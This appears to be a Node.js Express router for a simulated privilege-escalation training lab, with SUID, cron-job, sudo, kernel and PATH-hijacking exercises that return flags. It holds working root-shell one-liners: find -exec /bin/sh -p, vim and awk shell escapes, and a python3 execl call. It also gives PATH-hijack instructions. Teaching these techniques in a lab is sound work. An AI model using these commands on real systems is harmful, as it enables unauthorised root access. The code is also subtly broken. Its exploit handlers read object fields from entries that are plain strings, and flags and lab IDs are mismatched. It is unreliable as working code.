const express = require('express');
const router = express.Router();

router.get('/', (req, res) => {
  res.render('labs/privesc/index', {
    title: 'Privilege Escalation Labs',
    labs: [
      { id: 'suid', name: 'SUID Binary Exploitation', difficulty: 'Medium', path: '/labs/privesc/suid' },
      { id: 'cron', name: 'Cron Job Hijacking', difficulty: 'Medium', path: '/labs/privesc/cron' },
      { id: 'sudo', name: 'Sudo Misconfiguration', difficulty: 'Easy', path: '/labs/privesc/sudo' },
      { id: 'kernel', name: 'Kernel Exploit Concepts', difficulty: 'Hard', path: '/labs/privesc/kernel' },
      { id: 'path', name: 'PATH Variable Hijacking', difficulty: 'Medium', path: '/labs/privesc/path' },
    ]
  });
});

// Simulated Linux system. NOTE: the lab views render these arrays as plain
// strings (<%= item %>), so every entry here must be a string, not an object.
const systemInfo = {
  currentUser: 'www-data',
  kernel: 'Linux 3.13.0-24-generic #46-Ubuntu SMP x86_64',
  os: 'Ubuntu 14.04.1 LTS',
  arch: 'x86_64',
  suidBinaries: [
    '-rwsr-xr-x 1 root root  /usr/bin/passwd      (not exploitable)',
    '-rwsr-xr-x 1 root root  /usr/bin/sudo        (not exploitable)',
    '-rwsr-xr-x 1 root root  /usr/bin/find        (GTFOBins: find . -exec /bin/sh -p \\;)',
    '-rwsr-xr-x 1 root root  /usr/bin/vim         (GTFOBins: vim -c ":!/bin/sh")',
    '-rwsr-xr-x 1 root root  /usr/bin/python3     (python3 -c \'import os;os.execl("/bin/sh","sh","-p")\')',
    '-rwsr-xr-x 1 root root  /opt/statuscheck     (calls "cat" with a relative path - PATH hijack!)',
  ],
  cronJobs: [
    '* * * * *   root  /opt/scripts/cleanup.sh    (WORLD-WRITABLE!)',
    '*/5 * * * * root  /opt/scripts/backup.sh     (root-owned, not writable)',
    '0 * * * *   root  /tmp/monitor.py            (/tmp is world-writable!)',
  ],
  sudoConfig: [
    'User www-data may run the following commands:',
    '  (ALL) NOPASSWD: /usr/bin/vim',
    '  (ALL) NOPASSWD: /usr/bin/find',
    '  (ALL) NOPASSWD: /usr/bin/awk',
    '  (ALL) NOPASSWD: /usr/bin/env',
  ],
  writableFiles: [
    '/opt/scripts/cleanup.sh',
    '/tmp/monitor.py',
    '/etc/cron.d/webapp',
  ]
};

router.get('/suid', (req, res) => { res.render('labs/privesc/suid', { title: 'SUID Exploitation', labId: 'privesc-suid', systemInfo }); });

router.post('/suid/exploit', (req, res) => {
  const { binary, payload } = req.body;
  const suid = systemInfo.suidBinaries.find(b => b.path.includes(binary));
  if (suid && suid.exploitable) {
    res.json({ success: true, message: `Exploited ${suid.path}! Got root shell.`, flag: 'FLAG{suid_root_shell}', explanation: suid.note });
  } else {
    res.json({ success: false, message: 'Not exploitable or binary not found. Check GTFOBins for exploitable SUID binaries.' });
  }
});

router.get('/cron', (req, res) => { res.render('labs/privesc/cron', { title: 'Cron Job Hijacking', labId: 'privesc-cron', systemInfo }); });

router.post('/cron/exploit', (req, res) => {
  const { target, payload } = req.body;
  const cron = systemInfo.cronJobs.find(c => c.writable && c.command.includes(target));
  if (cron) {
    res.json({ success: true, flag: 'FLAG{cron_job_hijacked}', message: `Modified ${cron.command} with: ${payload}. Will execute as root on next schedule!` });
  } else {
    res.json({ success: false, message: 'Target not writable or not found. Look for world-writable cron scripts.' });
  }
});

router.get('/sudo', (req, res) => { res.render('labs/privesc/sudo', { title: 'Sudo Misconfiguration', labId: 'privesc-suid', systemInfo }); });

router.post('/sudo/exploit', (req, res) => {
  const { command } = req.body;
  const exploits = {
    'vim': 'sudo vim -c \':!sh\'',
    'find': 'sudo find / -exec /bin/sh \\;',
    'awk': 'sudo awk \'BEGIN {system("/bin/sh")}\'',
    'env': 'sudo env /bin/sh',
  };
  const match = Object.entries(exploits).find(([key]) => command.includes(key));
  if (match) {
    res.json({ success: true, flag: 'FLAG{suid_root_shell}', message: `Root shell via: ${match[1]}` });
  } else {
    res.json({ success: false, message: 'Try using one of the allowed sudo commands to spawn a shell. Check GTFOBins!' });
  }
});

router.get('/kernel', (req, res) => { res.render('labs/privesc/kernel', { title: 'Kernel Exploits', labId: 'privesc-suid', systemInfo }); });
router.get('/path', (req, res) => { res.render('labs/privesc/path', { title: 'PATH Hijacking', labId: 'privesc-cron', systemInfo }); });

router.post('/path/exploit', (req, res) => {
  const { maliciousBinary } = req.body;
  if (maliciousBinary && (maliciousBinary.includes('cat') || maliciousBinary.includes('sh'))) {
    res.json({ success: true, flag: 'FLAG{suid_root_shell}', message: 'PATH hijack successful! SUID binary called your malicious binary instead of the real one.' });
  } else {
    res.json({ success: false, hint: 'The SUID binary /opt/statuscheck calls "cat" without full path. Create a malicious "cat" in /tmp and prepend /tmp to PATH!' });
  }
});

module.exports = router;
